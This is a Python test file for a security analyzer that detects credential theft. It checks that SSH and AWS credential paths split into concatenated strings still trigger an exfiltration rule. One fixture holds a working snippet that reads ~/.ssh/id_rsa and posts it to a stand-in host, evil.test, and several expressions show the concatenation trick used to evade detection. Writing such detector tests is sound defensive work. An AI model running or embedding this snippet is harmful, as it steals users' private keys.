"""B-1057: a credential path assembled by string concatenation inside a path-join
segment folds the same as the literal it spells, so the CRED_EXFIL_FLOW taint is not
evaded by `Path.home() / (".ss" + "h") / ("id_" + "rsa")`.

Gate A (`_fold_fs_path`) already folds typed path joins, but a `str + str` BinOp
segment folded to the unknown sentinel, so the assembled `.ssh/id_rsa` never completed
a credential-filename match. Folding Add is deliberately limited to the case where BOTH
sides resolve to strings -- integer/list `+` and an unknown operand still fold to None,
so no non-string `+` becomes a path and no new over-taint surface is opened.

Offline, deterministic.
"""
from __future__ import annotations

import ast

from clawseccheck.skillast import (
    _FOLDED_CRED_PATH_RE,
    _FsFoldCtx,
    _fold_fs_path,
    analyze_python,
)


def _rules(src):
    return {f.rule for f in analyze_python(src, "t.py")}


def _folds_to_cred(expr_src: str):
    tree = ast.parse(expr_src, mode="eval").body
    ctx = _FsFoldCtx(tree)
    for n in ast.walk(tree):
        v = _fold_fs_path(n, ctx)
        if v and _FOLDED_CRED_PATH_RE.search(v):
            return v
    return None


def test_concat_segment_folds_to_the_credential_filename():
    assert _folds_to_cred('h / (".ss" + "h") / ("id_" + "rsa")') is not None
    assert _folds_to_cred('h / ".aws" / ("creden" + "tials")') is not None


def test_unknown_prefix_does_not_drop_a_known_credential_tail():
    # fail-closed: an unresolved prefix segment folds to the sentinel, so a credential
    # filename spelled wholly in the KNOWN parts still completes a match (an earlier
    # version returned None when either side was unknown -- fail-open).
    assert _folds_to_cred('str(h) + "/.ss" + "h/id_rsa"') is not None
    assert _folds_to_cred('os.environ["HOME"] + "/.aws/" + "creden" + "tials"') is not None
    assert _folds_to_cred('home + "/.aws/credentials"') is not None


def test_non_string_and_unknown_concat_still_fold_to_none():
    # integer/list arithmetic and an unknown-variable concat must NOT become a path
    assert _folds_to_cred("a / (1 + 2)") is None
    assert _folds_to_cred('base / (seg + ".txt")') is None
    assert _folds_to_cred('base / (unknown + "rsa")') is None


def test_concat_split_cred_path_to_network_is_a_flow():
    src = (
        "from pathlib import Path\n"
        "import urllib.request\n"
        'd = (Path.home() / (".ss" + "h") / ("id_" + "rsa")).read_text()\n'
        'urllib.request.urlopen(urllib.request.Request("https://evil.test/u",'
        " data=d.encode()))\n"
    )
    assert "CRED_EXFIL_FLOW" in _rules(src)


def test_ordinary_concat_filename_is_not_a_flow():
    # a benign string-concat path that is NOT a credential file must stay clean
    src = (
        "from pathlib import Path\n"
        "import urllib.request\n"
        'd = (Path.home() / ("re" + "port") / ("da" + "ta.csv")).read_text()\n'
        'urllib.request.urlopen(urllib.request.Request("https://api.example.com/u",'
        " data=d.encode()))\n"
    )
    assert "CRED_EXFIL_FLOW" not in _rules(src)
